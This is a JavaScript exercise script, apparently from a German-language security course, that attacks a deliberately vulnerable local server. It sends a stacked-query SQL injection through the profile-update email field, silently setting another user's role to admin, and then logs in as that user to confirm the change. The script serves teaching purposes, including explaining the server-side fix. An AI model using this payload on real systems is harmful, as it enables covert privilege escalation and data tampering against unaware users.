// =====================================================================
//  ANGRIFF 2.3 – INTEGRITÄT
// =====================================================================
//  Ziel: Daten verändern, ohne dass die betroffene Person es merkt.
//
//  Szenario: Über /profile/update darf man eigentlich nur die eigene
//  E-Mail ändern. Der Endpoint erlaubt aber "stacked queries"
//  (mehrere durch ; getrennte Statements), weil multipleStatements
//  aktiviert ist und die Eingabe verkettet wird.
//
//  Deine Aufgabe: Hänge an das erlaubte UPDATE ein ZWEITES, verstecktes
//  UPDATE an, das z. B. die Rolle des Benutzers "marco" auf 'admin'
//  setzt. marco bemerkt davon nichts.
//
//  Aufbau der verwundbaren Query im Server:
//     UPDATE users SET email = '<newEmail>' WHERE username = '<username>'
//  Überlege: Wie schliesst du das erste Statement ab (Anführungszeichen
//  + ;), hängst dein UPDATE an und kommentierst den Rest weg (-- )?
//
//  Für das Fachgespräch: Erkläre, warum multipleStatements=true die
//  Voraussetzung ist und was der Server-seitige Fix wäre.
//
//  Tipp zum Prüfen: Vorher/nachher via /login (oder direkt in der DB)
//  die Rolle von marco kontrollieren.
//
//  Voraussetzung: verwundbarer Server läuft (npm run start:vulnerable).
//  Aufruf:        npm run attack:integrity
// =====================================================================

const BASE_URL = process.env.TARGET_URL || 'http://127.0.0.1:3000';

async function run() {
  const username = 'felix';
  const newEmail =
    "x@x.ch'; UPDATE users SET role='admin' WHERE username='marco'; -- ";

  const res = await fetch(`${BASE_URL}/profile/update`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, newEmail }),
  });

  const data = await res.json();
  console.log('Server-Antwort:', data);

  const loginRes = await fetch(`${BASE_URL}/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      username: 'marco',
      password: 'passw0rd',
    }),
  });

  const loginData = await loginRes.json();

  console.log('Nachweis: Marcos Benutzerdaten:', loginData);
}

run().catch((err) => {
  console.error('Angriff fehlgeschlagen:', err.message);
});
